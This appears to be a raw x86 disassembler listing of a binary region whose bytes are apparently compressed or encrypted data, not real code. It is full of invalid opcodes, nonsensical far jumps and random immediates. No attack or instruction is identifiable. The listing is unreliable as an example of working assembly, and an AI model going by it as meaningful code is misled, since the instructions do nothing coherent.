  42c9ad:	(bad)  
  42c9af:	xchg   BYTE PTR [ebx+0x11],dl
  42c9b2:	sub    eax,0xdd6dc0c8
  42c9b7:	add    BYTE PTR [ebp+0x7eaa98a8],0xd8
  42c9be:	dec    ebx
  42c9bf:	test   BYTE PTR [ebx],ah
  42c9c1:	ja     0x42c9e6
  42c9c3:	das    
  42c9c4:	out    dx,eax
  42c9c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c9c6:	mov    ebp,0x7052044a
  42c9cb:	push   edi
  42c9cc:	or     ebx,DWORD PTR [ecx-0x232755c7]
  42c9d2:	aad    0xf2
  42c9d4:	and    esp,DWORD PTR [edi+0x36668ef9]
  42c9da:	leave  
  42c9db:	mov    DWORD PTR [eax-0x427b7e30],eax
  42c9e1:	or     al,0x3a
  42c9e3:	icebp  
  42c9e4:	pop    eax
  42c9e5:	int    0x6f
  42c9e7:	mov    esp,0x9fc38cc4
  42c9ec:	call   0x1537:0xb9b92934
  42c9f3:	jae    0x42c9f2
  42c9f5:	(bad)  
  42c9f6:	jmp    0x42ca42
  42c9f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c9f9:	enter  0xc75b,0x84
  42c9fd:	aam    0x99
  42c9ff:	dec    edi
  42ca00:	jecxz  0x42c9ca
  42ca02:	mov    dh,0x71
  42ca04:	int    0xc0
  42ca06:	aaa    
  42ca07:	loop   0x42ca45
  42ca09:	fistp  WORD PTR [ebx-0x1d9ca385]
  42ca0f:	stc    
  42ca10:	jmp    0xd864:0x8724e5dd
  42ca17:	pop    ebp
  42ca18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ca19:	jae    0x42ca2f
  42ca1b:	inc    eax
  42ca1c:	jno    0x42ca2d
  42ca1e:	shl    DWORD PTR [esi+0x78],0x3b
  42ca22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ca23:	push   es
  42ca24:	mov    gs,WORD PTR [edx-0x7478eabf]
  42ca2a:	or     BYTE PTR [edi],ch
  42ca2c:	sub    al,0x91
  42ca2e:	or     ah,BYTE PTR [eax-0x63f2243b]
  42ca34:	mov    DWORD PTR [ecx],ebx
  42ca36:	mov    bl,0x99
  42ca38:	or     DWORD PTR [esi-0x19267b94],ebp
  42ca3e:	mov    eax,0x45f80a0e
  42ca43:	add    dh,BYTE PTR [ecx+0x3a75f5ea]
  42ca49:	test   BYTE PTR [eax-0x35c7da4],al
  42ca4f:	nop
  42ca50:	lock fpatan 
  42ca53:	sbb    eax,0x4142ae80
  42ca58:	es call 0x7bec1f2b
  42ca5e:	or     al,0x86
  42ca60:	or     edi,ebx
  42ca62:	aaa    
  42ca63:	jnp    0x42ca10
  42ca65:	pop    eax
  42ca66:	in     eax,dx
  42ca67:	push   edi
  42ca68:	(bad)  
  42ca69:	xchg   esp,eax
  42ca6a:	push   ebp
  42ca6b:	add    al,0xa4
  42ca6d:	inc    ebp
  42ca6e:	sbb    BYTE PTR [ecx+0x12],ah
  42ca71:	aas    
  42ca72:	xchg   edi,eax
  42ca73:	xchg   esp,eax
  42ca74:	repnz (bad) 
  42ca76:	mov    esi,0xc4b64ba5
  42ca7b:	sbb    eax,0x803e5770
  42ca80:	push   esi
  42ca81:	ins    BYTE PTR es:[edi],dx
  42ca82:	scas   al,BYTE PTR es:[edi]
  42ca83:	push   edi
  42ca84:	inc    edx
  42ca85:	fnsave [esi-0x34c644f2]
  42ca8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ca8c:	repz or eax,0xbbf3
	...
  42caf2:	add    BYTE PTR [eax],al
  42caf4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42caf5:	fimul  DWORD PTR [eax-0x10ac02bf]
  42cafb:	(bad)  
  42cafc:	fadd   QWORD PTR [ebp+0xbb06ec0]
  42cb02:	inc    edx
  42cb03:	inc    esp
  42cb04:	cld    
  42cb05:	fld    QWORD PTR [ecx]
  42cb07:	add    BYTE PTR [ecx+eax*1],al
  42cb0a:	add    BYTE PTR [eax],al
  42cb0c:	ss xchg ebp,eax
  42cb0e:	mov    DWORD PTR [edi+0x2b6f96e9],ebp
  42cb14:	test   ebx,ecx
  42cb16:	outs   dx,DWORD PTR ds:[esi]
  42cb17:	dec    edx
  42cb18:	add    BYTE PTR [esi+ecx*4],al
  42cb1b:	adc    BYTE PTR [edx-0x2d],al
  42cb1e:	in     al,0x34
  42cb20:	popf   
  42cb21:	test   eax,0x41024c4e
  42cb26:	into   
  42cb27:	(bad)  
  42cb28:	out    dx,al
  42cb29:	test   edi,edi
  42cb2b:	cli    
  42cb2c:	sub    eax,0xb1db72c1
  42cb31:	in     eax,dx
  42cb32:	add    al,0xca
  42cb34:	test   al,0xe
  42cb36:	popf   
  42cb37:	imul   edi,DWORD PTR [edi],0x7f0441d2
  42cb3d:	xor    eax,0xf9d0f161
  42cb42:	daa    
  42cb43:	inc    esp
  42cb44:	imul   esp,DWORD PTR [ecx+esi*2],0xffffffa2
  42cb48:	mov    edx,DWORD PTR cs:[ebp+0x6a60aa4d]
  42cb4f:	pop    esi
  42cb51:	push   edi
  42cb52:	cmc    
  42cb53:	sbb    BYTE PTR [edi+0x7744000f],ch
  42cb59:	pop    esi
  42cb5a:	sahf   
  42cb5b:	(bad)  
  42cb5c:	pop    ds
  42cb5d:	popa   
  42cb5e:	out    0x70,eax
  42cb60:	add    BYTE PTR [edx+0x44],cl
  42cb63:	dec    esi
  42cb64:	(bad)  [edx+0xd]
  42cb67:	ins    DWORD PTR es:[edi],dx
  42cb68:	out    dx,al
  42cb69:	adc    eax,0x97069baf
  42cb6e:	pop    ebp
  42cb6f:	out    0xfa,eax
  42cb71:	aaa    
  42cb72:	scas   al,BYTE PTR es:[edi]
  42cb73:	add    BYTE PTR [edi],0x9a
  42cb76:	adc    BYTE PTR [esi-0x1b],ch
  42cb79:	mov    ebp,ebx
  42cb7b:	hlt    
  42cb7c:	rcl    cl,0xd5
  42cb7f:	jp     0x42cbc2
  42cb81:	(bad)  [esi]
  42cb83:	xor    eax,0x173e51aa
  42cb88:	scas   eax,DWORD PTR es:[edi]
  42cb89:	push   esi
  42cb8a:	repz sub al,BYTE PTR [esi+0x30]
  42cb8e:	repnz push 0x21
  42cb91:	stos   DWORD PTR es:[edi],eax
  42cb92:	push   ss
  42cb93:	add    DWORD PTR [esi],esp
  42cb95:	mov    DWORD PTR ds:0x13a5e914,ecx
  42cb9b:	xchg   esi,eax
  42cb9c:	pop    eax
  42cb9d:	or     ebp,DWORD PTR [eax+edx*1-0x20480baf]
  42cba4:	sti    
  42cba5:	xchg   edx,eax
  42cba6:	sahf   
  42cba7:	xor    ebx,DWORD PTR [esi]
  42cba9:	sbb    BYTE PTR [edi-0x7dacb6c6],al
  42cbaf:	out    0x94,al
  42cbb1:	std    
  42cbb2:	or     DWORD PTR ds:0xfe9d18b4,ebp
  42cbb8:	sub    al,0x80
  42cbba:	test   al,0x80
  42cbbc:	and    al,0x4e
  42cbbe:	mov    dl,0xca
  42cbc0:	inc    eax
  42cbc1:	xor    dh,BYTE PTR [ebx]
  42cbc3:	shl    DWORD PTR [esi],0xf0
  42cbc6:	and    eax,0xa472d00c
  42cbcb:	nop
  42cbcc:	mov    ebx,0x38d640c6
  42cbd1:	add    eax,0xc42bac7e
  42cbd6:	push   es
  42cbd7:	sar    BYTE PTR [ebx+0xe],cl
  42cbda:	(bad)  
  42cbdb:	(bad)  
  42cbdc:	test   al,0x9d
  42cbde:	sub    esi,esp
  42cbe0:	pop    ds
  42cbe1:	cdq    
  42cbe2:	pop    ecx
  42cbe3:	mov    ds:0xe8fe35bb,al
  42cbe8:	xor    eax,0x5768ebe1
  42cbed:	mov    ah,0xcd
  42cbef:	jmp    0xb17bcd5f
  42cbf4:	cwde   
  42cbf5:	mov    bh,0x61
  42cbf7:	dec    edx
  42cbf8:	cmp    eax,0x5d6421a3
  42cbfd:	jge    0x42cc39
  42cbff:	push   esi
  42cc00:	push   es
  42cc01:	(bad)  
  42cc02:	pop    ds
  42cc03:	inc    edx
  42cc04:	pop    ebx
  42cc05:	mov    eax,ds:0xbeb98ee6
  42cc0a:	cwde   
  42cc0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cc0c:	(bad)  
  42cc0e:	mov    esi,DWORD PTR [edx+0x0]
	...
  42cc71:	add    BYTE PTR [eax],al
  42cc73:	add    BYTE PTR [edi+0x2],bh
  42cc76:	mov    esp,DWORD PTR [edi+edi*8-0x13]
  42cc7a:	call   FWORD PTR [ebx]
  42cc7c:	fisttp WORD PTR [ebp+0x1]
  42cc7f:	or     eax,0x379ac5ae
  42cc84:	add    bh,bl
  42cc86:	add    DWORD PTR [eax],eax
  42cc88:	add    al,0x1
  42cc8a:	add    BYTE PTR [eax],al
  42cc8c:	add    DWORD PTR [edx+0x6c],ebx
  42cc8f:	(bad)  
  42cc91:	(bad)  
  42cc92:	(bad)  
  42cc94:	call   0xb670868
  42cc99:	out    dx,eax
  42cc9a:	sub    bl,cl
  42cc9c:	xchg   edi,eax
  42cc9d:	inc    esi
  42cc9e:	cmp    eax,0xcbc165e
  42cca3:	mov    ebx,0x3728a3b6
  42cca8:	(bad)  
  42cca9:	and    bh,BYTE PTR [ecx+ebx*1]
  42ccac:	dec    edx
  42ccad:	xchg   edx,eax
  42ccae:	js     0x42cc66
  42ccb0:	fnstenv [ecx+0x50]
  42ccb3:	ficom  WORD PTR [edi]
  42ccb5:	sahf   
  42ccb6:	dec    esi
  42ccb7:	aas    
  42ccb8:	mov    edx,0x645d7f8a
  42ccbd:	shl    DWORD PTR [ecx-0x74a02479],cl
  42ccc3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ccc4:	sahf   
  42ccc5:	out    0xcd,al
  42ccc7:	or     DWORD PTR [edi],ebx
  42ccc9:	jns    0x42cd2c
  42cccb:	inc    ecx
  42cccc:	loopne 0x42ccc7
  42ccce:	ins    DWORD PTR es:[edi],dx
  42cccf:	mov    ch,0xab
  42ccd1:	push   es
  42ccd2:	retf   0x4350
  42ccd5:	mov    ah,0xa8
  42ccd7:	or     DWORD PTR [ebx+0x6],0x2
  42ccdb:	pop    eax
  42ccdc:	push   es
  42ccdd:	xchg   DWORD PTR [esi-0xb29c84a],ebp
  42cce3:	imul   ebx,DWORD PTR [eax-0x62],0x7bee2029
  42ccea:	rol    DWORD PTR [ecx-0x4aeee0d1],0x37
  42ccf1:	mov    bl,0xde
  42ccf3:	nop
  42ccf4:	mov    dh,0x4f
  42ccf6:	es inc ecx
  42ccf8:	push   ds
  42ccf9:	fs lahf 
  42ccfb:	sbb    dh,dl
  42ccfd:	mov    esp,0x760e4081
  42cd02:	mov    bl,0x20
  42cd04:	in     eax,0x9a
  42cd06:	ins    BYTE PTR es:[edi],dx
  42cd07:	(bad)  
  42cd08:	xchg   ebx,eax
  42cd09:	pop    esp
  42cd0a:	lds    ebp,FWORD PTR [ecx-0x5805988c]
  42cd10:	lahf   
  42cd11:	cli    
  42cd12:	in     al,dx
  42cd13:	fstp   TBYTE PTR [edx-0x80]
  42cd16:	sub    eax,0x4b01f87
  42cd1b:	jp     0x42cce3
  42cd1d:	jecxz  0x42cd70
  42cd1f:	fcmovnbe st,st(6)
  42cd21:	mov    eax,ds:0x34840bb1
  42cd26:	icebp  
  42cd27:	sahf   
  42cd28:	lahf   
  42cd29:	ja     0x42cd0d
  42cd2b:	xor    BYTE PTR [ecx],bh
  42cd2d:	push   edi
  42cd2e:	(bad)  
  42cd2f:	call   0xf98b72ad
  42cd34:	push   esi
  42cd35:	cmp    dh,dh
  42cd37:	nop
  42cd38:	add    al,0x60
  42cd3a:	int    0x30
  42cd3c:	fs inc ebx
  42cd3e:	mov    bh,0xbd
  42cd40:	and    eax,0x1eb139a0
  42cd45:	xor    eax,0x494c461b
  42cd4a:	and    esi,DWORD PTR [ebp-0x517970e9]
  42cd50:	scas   eax,DWORD PTR es:[edi]
  42cd51:	fwait
  42cd52:	sbb    BYTE PTR [ecx],al
  42cd54:	cmp    ebp,ebx
  42cd56:	je     0x42cd17
  42cd58:	jg     0x42ccf2
  42cd5a:	xchg   edi,eax
  42cd5b:	fcomi  st,st(7)
  42cd5d:	arpl   di,sp
  42cd5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cd60:	jnp    0x42cd13
  42cd62:	call   0x914e:0x9a432618
  42cd69:	retf   
  42cd6a:	and    eax,0xc321308a
  42cd6f:	out    0x3b,al
  42cd71:	sbb    dh,BYTE PTR [esi+esi*1-0x290a809e]
  42cd78:	stos   BYTE PTR es:[edi],al
  42cd79:	pop    ds
  42cd7a:	and    eax,0x539fa172
  42cd7f:	fwait
  42cd80:	test   eax,0x574de46d
  42cd85:	dec    edx
  42cd86:	mov    ds:0xe0ab740b,al
  42cd8b:	adc    al,0xbe
  42cd8d:	into   
  42cd8e:	sub    eax,0xdc
	...
  42cdf3:	add    BYTE PTR [ecx],bl
  42cdf5:	mov    eax,ds:0xdffe87fe
  42cdfa:	jns    0x42cdbb
  42cdfc:	xchg   BYTE PTR [esi],dh
  42cdfe:	xchg   esi,eax
  42cdff:	mov    ch,0x53
  42ce01:	cmc    
  42ce02:	ins    DWORD PTR es:[edi],dx
  42ce03:	adc    al,0x4
  42ce05:	loopne 0x42ce08
  42ce07:	add    BYTE PTR [ecx+eax*1],al
  42ce0a:	add    BYTE PTR [eax],al
  42ce0c:	push   edi
  42ce0d:	inc    edi
  42ce0e:	stc    
  42ce0f:	jmp    0xe2eb:0xdea96673
  42ce16:	cli    
  42ce17:	imul   eax,DWORD PTR [edx],0xffffffc1
  42ce1a:	clc    
  42ce1b:	mov    ebx,0x6659aea4
  42ce20:	xchg   ebp,eax
  42ce21:	ret    0xc0d9
  42ce24:	adc    esi,esi
  42ce26:	pop    ss
  42ce27:	pop    edx
  42ce28:	mov    al,ds:0x243cc04f
  42ce2d:	jmp    0x5b4b:0xad5e6a40
  42ce34:	cmp    al,0xfd
  42ce36:	push   ebp
  42ce37:	push   eax
  42ce38:	loopne 0x42ce13
  42ce3a:	dec    edx
  42ce3b:	jae    0x42cdd5
  42ce3d:	dec    edx
  42ce3e:	sbb    dh,BYTE PTR [ecx]
  42ce40:	ss push es
  42ce42:	popf   
  42ce43:	aad    0xf
  42ce45:	std    
  42ce46:	aam    0x2a
  42ce48:	retf   0x859b
  42ce4b:	ret    
  42ce4c:	out    dx,al
  42ce4d:	pop    esi
  42ce4e:	imul   eax,ebx,0x2df2ee7c
  42ce54:	mov    bl,0xf0
  42ce56:	xor    DWORD PTR [eax+ecx*4+0x54],edi
  42ce5a:	inc    esi
  42ce5b:	jne    0x42cea9
  42ce5d:	outs   dx,BYTE PTR ds:[esi]
  42ce5e:	pop    ebp
  42ce5f:	push   ds
  42ce60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ce61:	push   eax
  42ce62:	adc    cl,BYTE PTR [edx+0x478df5f5]
  42ce68:	sub    esi,DWORD PTR [eax+0x76]
  42ce6b:	in     eax,dx
  42ce6c:	sahf   
  42ce6d:	xchg   edx,eax
  42ce6e:	(bad)  
  42ce6f:	dec    ecx
  42ce70:	not    DWORD PTR [eax+0x545ee557]
  42ce76:	test   BYTE PTR [edi-0x79],ch
  42ce79:	push   es
  42ce7a:	add    cl,BYTE PTR [ecx-0x5]
  42ce7d:	xchg   esi,eax
  42ce7e:	or     al,al
  42ce80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ce81:	(bad)
  42ce84:	inc    ebx
  42ce85:	cmp    BYTE PTR [edx-0x618506e],cl
  42ce8b:	xor    ebp,0x42b97183
  42ce91:	into   
  42ce92:	imul   edx,edi,0xfffffffd
  42ce95:	clc    
  42ce96:	push   ss
  42ce97:	dec    esp
  42ce98:	mov    ecx,0x64439397
  42ce9d:	cli    
  42ce9e:	stc    
  42ce9f:	mov    ebx,0x6eec309a
  42cea4:	ret    
  42cea5:	xor    ah,dh
  42cea7:	ins    DWORD PTR es:[edi],dx
  42cea8:	int    0x1d
  42ceaa:	and    DWORD PTR [esi-0x35],eax
  42cead:	mov    ds:0x42218f76,eax
  42ceb2:	icebp  
  42ceb3:	leave  
  42ceb4:	dec    esi
  42ceb5:	sub    DWORD PTR [ebx],ebp
  42ceb7:	dec    edi
  42ceb8:	xchg   esp,eax
  42ceb9:	(bad)  
  42ceba:	enter  0x79d8,0x22
  42cebe:	xchg   ebp,eax
  42cebf:	daa    
  42cec0:	or     DWORD PTR [esi-0x6c],0xdd7edfa5
  42cec7:	mov    esp,0xc06dd74c
  42cecc:	fidivr WORD PTR [eax+0x391f0584]
  42ced2:	leave  
  42ced3:	ret    0x33fe
  42ced6:	jg     0x42cead
  42ced8:	in     al,0x9
  42ceda:	cmc    
  42cedb:	dec    eax
  42cedc:	inc    ecx
  42cedd:	xchg   ebp,eax
  42cede:	fisubr WORD PTR [ecx+0x7571cc1c]
  42cee4:	repz stc 
  42cee6:	mov    eax,0x1c484855
  42ceeb:	aam    0xd0
  42ceed:	push   edi
  42ceee:	push   ss
  42ceef:	or     ebp,DWORD PTR [edx-0x2bdff425]
  42cef5:	test   al,0x6
  42cef7:	outs   dx,BYTE PTR ds:[esi]
  42cef8:	sbb    ecx,ebx
  42cefa:	pushf  
  42cefb:	xchg   esp,eax
  42cefc:	out    0x1f,al
  42cefe:	pop    eax
  42ceff:	stc    
  42cf00:	jge    0x42ceb5
  42cf02:	fwait
  42cf03:	push   edx
  42cf04:	sbb    ah,bh
  42cf06:	xchg   ebp,eax
  42cf07:	cmp    eax,0x3bd018c4
  42cf0c:	sub    BYTE PTR ds:0xdfa7,dl
	...
  42cf72:	add    BYTE PTR [eax],al
  42cf74:	jae    0x42cfb3
  42cf76:	fadd   st,st(1)
  42cf78:	fsubrp st(5),st
  42cf7a:	jnp    0x42cf3b
  42cf7c:	or     al,BYTE PTR [esi]
  42cf7e:	cld    
  42cf7f:	les    esp,FWORD PTR [edx]
  42cf81:	pop    ebx
  42cf82:	ss adc al,0x8
  42cf85:	loope  0x42cf88
  42cf87:	add    BYTE PTR [ecx+eax*1],al
  42cf8a:	add    BYTE PTR [eax],al
  42cf8c:	mov    dh,0x6c
  42cf8e:	inc    esp
  42cf8f:	test   DWORD PTR [ebp-0x7fbd5923],edx
  42cf95:	test   eax,0x99caa25
  42cf9a:	neg    DWORD PTR [edi+0x6f]
  42cf9d:	mov    al,0x27
  42cf9f:	jmp    0x84c6d35c
  42cfa4:	mov    ch,0x15
  42cfa6:	pop    esp
  42cfa7:	loope  0x42cf34
  42cfa9:	popf   
  42cfaa:	aas    
  42cfab:	rcl    DWORD PTR [edx+0x17],cl
  42cfae:	ins    BYTE PTR es:[edi],dx
  42cfaf:	jecxz  0x42cf90
  42cfb1:	xchg   ecx,eax
  42cfb2:	mov    ebp,0x9763e89c
  42cfb7:	ss ins DWORD PTR es:[edi],dx
  42cfb9:	loop   0x42cfdb
  42cfbb:	into   
  42cfbc:	pop    ebx
  42cfbd:	xlat   BYTE PTR ds:[ebx]
  42cfbe:	fld    TBYTE PTR [ecx+0x33]
  42cfc1:	test   BYTE PTR [ecx],0xf5
  42cfc4:	repz das 
  42cfc6:	add    DWORD PTR [ebx-0x1b],ebp
  42cfc9:	pop    sp
  42cfcb:	cmp    al,0xf9
  42cfcd:	jecxz  0x42d009
  42cfcf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cfd0:	lods   eax,DWORD PTR ds:[esi]
  42cfd1:	adc    DWORD PTR [ecx-0x51150294],eax
  42cfd7:	test   eax,0x70d81894
  42cfdc:	and    dh,BYTE PTR [edi-0x76622f9e]
  42cfe2:	ret    
  42cfe3:	mov    dl,0xe5
  42cfe5:	jmp    0x6ea2:0xcfa79e61
  42cfec:	sub    DWORD PTR [edx],ebp
  42cfee:	pop    edx
  42cfef:	pop    esi
  42cff0:	push   ebx
  42cff1:	(bad)  
  42cff2:	into   
  42cff3:	cwde   
  42cff4:	sar    BYTE PTR [edx],cl
  42cff6:	cmc    
  42cff7:	xchg   BYTE PTR [esi+0x6cad2328],al
  42cffd:	inc    ebx
  42cffe:	xchg   ecx,eax
  42cfff:	cwde   
  42d000:	add    dl,al
  42d002:	dec    ebx
  42d003:	and    al,0x2c
  42d005:	test   eax,0xfb6c7998
  42d00a:	or     al,0xd6
  42d00c:	and    cl,BYTE PTR [edx-0x44658b9f]
  42d012:	pop    ds
  42d013:	out    0x60,eax
  42d015:	int    0x51
  42d017:	aas    
  42d018:	cmp    esp,DWORD PTR [edx-0x3176f217]
  42d01e:	in     al,0x8f
  42d020:	into   
  42d021:	lea    eax,[ebx+0x4b]
  42d024:	into   
  42d025:	fwait
  42d026:	sub    al,BYTE PTR [ecx-0x4c9459cb]
  42d02c:	inc    eax
  42d02d:	mov    ds:0xe5df371d,eax
  42d032:	add    ch,BYTE PTR [esp+eiz*2-0x54451af5]
  42d039:	push   ecx
  42d03a:	push   ecx
  42d03b:	lds    edi,FWORD PTR [ebp+ebp*4-0x606c03dc]
  42d042:	or     BYTE PTR [ecx+0x3916a88e],dl
  42d048:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d049:	mov    bh,0xeb
  42d04b:	pop    ebx
  42d04c:	or     ah,ah
  42d04e:	jns    0x42d03e
  42d050:	ins    BYTE PTR es:[edi],dx
  42d051:	xor    DWORD PTR [edx+0xfd1e2e8],esi
  42d057:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d058:	or     cl,BYTE PTR [edi]
  42d05a:	adc    DWORD PTR ds:0x8147c5f0,edi
  42d060:	daa    
  42d061:	lock jp 0x42d04d
  42d064:	shl    BYTE PTR [esp+edi*4-0x38],0x27
  42d069:	les    ebx,FWORD PTR [edx+0x6591b3ad]
  42d06f:	rcl    BYTE PTR [esi+0x6f],0xa6
  42d073:	test   al,0x62
  42d075:	mov    ebp,0x9821dc34
  42d07a:	push   ebx
  42d07b:	push   cs
  42d07c:	sar    DWORD PTR [ebp+0x329b00f5],1
  42d082:	xor    al,0xd5
  42d084:	dec    eax
  42d085:	mov    ch,0x3a
  42d087:	ds sub eax,0xec110ba9
  42d08d:	stos   BYTE PTR es:[edi],al
  42d08e:	inc    esp
  42d08f:	cmp    eax,DWORD PTR [eax]
	...
  42d0f1:	add    BYTE PTR [eax],al
  42d0f3:	add    BYTE PTR [eax+0x3a],dl
  42d0f6:	(bad)  
  42d0f7:	sub    al,0xee
  42d0f9:	cld    
  42d0fa:	cli    
  42d0fb:	jle    0x42d090
  42d0fd:	dec    esp
  42d0fe:	nop
  42d0ff:	xor    BYTE PTR [eax+0xce5e53d],ah
  42d105:	loop   0x42d108
  42d107:	add    BYTE PTR [ecx+eax*1],al
  42d10a:	add    BYTE PTR [eax],al
  42d10c:	push   ss
  42d10d:	addr16 mov ch,0x1b
  42d110:	xchg   edi,eax
  42d111:	jnp    0x42d09d
  42d113:	dec    ecx
  42d114:	adc    bl,dh
  42d116:	xchg   DWORD PTR [edx-0x6d],eax
  42d119:	cs ss hlt 
  42d11c:	leave  
  42d11d:	add    eax,ebp
  42d11f:	pop    edx
  42d120:	xchg   esp,eax
  42d121:	xor    BYTE PTR [edx+0x76],ah
  42d124:	mov    bl,0xc2
  42d126:	pop    ebp
  42d127:	add    al,0xbd
  42d129:	inc    esp
  42d12a:	sub    DWORD PTR [ebx+0x13debe7e],0x22453087
  42d134:	and    al,0x1d
  42d136:	cli    
  42d137:	dec    ecx
  42d138:	push   esp
  42d139:	or     edx,DWORD PTR [esi]
  42d13b:	jns    0x42d0d5
  42d13d:	hlt    
  42d13e:	pop    ebx
  42d13f:	sbb    al,0x58
  42d141:	push   eax
  42d142:	adc    eax,0x7a5f2da1
  42d147:	mov    ch,0x68
  42d149:	(bad)  
  42d14a:	loope  0x42d144
  42d14c:	dec    esi
  42d14d:	inc    esp
  42d14e:	cli    
  42d14f:	adc    al,0xac
  42d151:	mov    esi,0x9559271c
  42d156:	js     0x42d1b7
  42d158:	jb     0x42d10e
  42d15a:	and    al,0x5e
  42d15c:	jae    0x42d15f
  42d15e:	cmp    BYTE PTR [ecx],bh
  42d160:	mov    cs,WORD PTR [ebx-0x4e74aabc]
  42d166:	inc    edx
  42d167:	leave  
  42d168:	jle    0x42d19f
  42d16a:	dec    ecx
  42d16b:	mov    ebp,0x20155ed5
  42d170:	fsubr  st(2),st
  42d172:	mov    ebp,0xb61f7c51
  42d177:	sbb    BYTE PTR [ebp-0x2c7a2714],al
  42d17d:	cdq    
  42d17e:	repnz out 0x45,eax
  42d181:	rol    BYTE PTR [ebx+0x48],1
  42d184:	and    eax,0xc93839f6
  42d189:	pop    es
  42d18a:	jnp    0x42d12b
  42d18c:	jl     0x42d1f1
  42d18e:	mov    edi,0x512bf4dc
  42d193:	pmuludq mm6,QWORD PTR [esi+0x7b]
  42d197:	fbld   TBYTE PTR [edx+0x29ed595f]
  42d19d:	shr    ch,1
  42d19f:	stc    
  42d1a0:	mov    ebx,0x5f4a5daf
  42d1a5:	mov    al,0x17
  42d1a7:	aas    
  42d1a8:	dec    esp
  42d1a9:	in     eax,0x3a
  42d1ab:	sahf   
  42d1ac:	cmp    al,0x19
  42d1ae:	cli    
  42d1af:	and    esp,DWORD PTR [ebx]
  42d1b1:	mov    dh,0xb5
  42d1b3:	push   edx
  42d1b4:	push   eax
  42d1b5:	sbb    al,0x9
  42d1b7:	gs mov esp,0x8c6cc4f4
  42d1bd:	daa    
  42d1be:	ins    BYTE PTR es:[edi],dx
  42d1bf:	fnsave [esi-0x6d10af70]
  42d1c5:	scas   al,BYTE PTR es:[edi]
  42d1c6:	push   cs
  42d1c7:	dec    edx
  42d1c8:	jnp    0x42d240
  42d1ca:	push   ebx
  42d1cb:	mov    al,ds:0x178ed69b
  42d1d0:	pop    ebx
  42d1d1:	popa   
  42d1d2:	ss or  al,0xca
  42d1d5:	inc    ebx
  42d1d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d1d7:	jmp    0xac9c:0x237107b8
  42d1de:	jg     0x42d168
  42d1e0:	jo     0x42d21d
  42d1e2:	pop    edx
  42d1e3:	cmc    
  42d1e4:	(bad)  
  42d1e5:	(bad)  
  42d1e6:	int3   
  42d1e7:	lods   eax,DWORD PTR ds:[esi]
  42d1e8:	and    eax,0xb74c7e26
  42d1ed:	mov    ah,0x2
  42d1ef:	add    eax,0xe423af8a
  42d1f4:	cmp    eax,0x80e56eaf
  42d1f9:	outs   dx,BYTE PTR ds:[esi]
  42d1fa:	es in  eax,dx
  42d1fc:	(bad)  
  42d1fd:	jmp    0x42d1f6
  42d1ff:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  42d201:	in     eax,dx
  42d202:	add    esp,DWORD PTR [esi]
  42d204:	imul   esp,ebx,0xa5972667
  42d20a:	aaa    
  42d20b:	xor    edi,ecx
  42d20d:	sub    edi,edi
  42d20f:	dec    edx
	...
  42d274:	lea    ecx,[eax]
  42d276:	pop    ebp
  42d277:	jbe    0x42d256
  42d279:	ja     0x42d22a
  42d27b:	sti    
  42d27c:	aaa    
  42d27d:	out    0x36,eax
  42d27f:	ja     0x42d26f
  42d281:	sub    bl,BYTE PTR [esi+0xf]
  42d284:	adc    bl,ah
  42d286:	add    DWORD PTR [eax],eax
  42d288:	add    al,0x1
  42d28a:	add    BYTE PTR [eax],al
  42d28c:	push   ecx
  42d28d:	push   ebx
  42d28e:	inc    ecx
  42d28f:	inc    eax
  42d290:	xor    al,0xe5
  42d292:	cmp    esi,DWORD PTR [edi-0x67fc4061]
  42d298:	and    BYTE PTR ds:0x5a87b556,cl
  42d29e:	dec    edx
  42d29f:	pushf  
  42d2a0:	or     ebp,0xffffffc5
  42d2a3:	retf   
  42d2a4:	stos   BYTE PTR es:[edi],al
  42d2a5:	(bad)  
  42d2a6:	out    dx,eax
  42d2a7:	or     BYTE PTR [edx-0x1a99efab],0xbc
  42d2ae:	sahf   
  42d2af:	pop    edx
  42d2b0:	sbb    cl,BYTE PTR [edx+ebx*8]
  42d2b3:	mov    dl,0xe0
  42d2b5:	(bad)  
  42d2b6:	das    
  42d2b7:	popa   
  42d2b8:	lods   al,BYTE PTR ds:[esi]
  42d2b9:	fdiv   DWORD PTR ds:0xbb941aff
  42d2bf:	push   esp
  42d2c0:	lea    ecx,[edi+0x1b]
  42d2c3:	sbb    esp,esp
  42d2c5:	sub    eax,0x22861613
  42d2ca:	and    eax,0x35433857
  42d2cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d2d0:	idiv   BYTE PTR cs:[esi]
  42d2d3:	test   eax,0x39b6f0af
  42d2d8:	aam    0x2c
  42d2da:	mov    eax,ds:0x13c8ac50
  42d2df:	and    DWORD PTR [ebx-0x4f3ad257],edx
  42d2e5:	sbb    BYTE PTR [esi+eax*2-0x1c],al
  42d2e9:	and    BYTE PTR [esi-0x6c],al
  42d2ec:	sahf   
  42d2ed:	push   0x35
  42d2ef:	dec    ecx
  42d2f0:	cmp    ebx,DWORD PTR [edi+0x41]
  42d2f3:	sub    bh,dl
  42d2f5:	(bad)  
  42d2f6:	scas   eax,DWORD PTR es:[edi]
  42d2f7:	in     al,0x18
  42d2f9:	pop    edi
  42d2fa:	mov    cl,0x5b
  42d2fc:	or     ebp,esp
  42d2fe:	imul   ecx,esp,0xffffff87
  42d301:	sub    BYTE PTR [ebx],ah
  42d303:	enter  0xe629,0x30
  42d307:	mov    bl,0x43
  42d309:	and    DWORD PTR [edi],esp
  42d30b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d30c:	sbb    ch,ch
  42d30e:	push   es
  42d30f:	jne    0x42d376
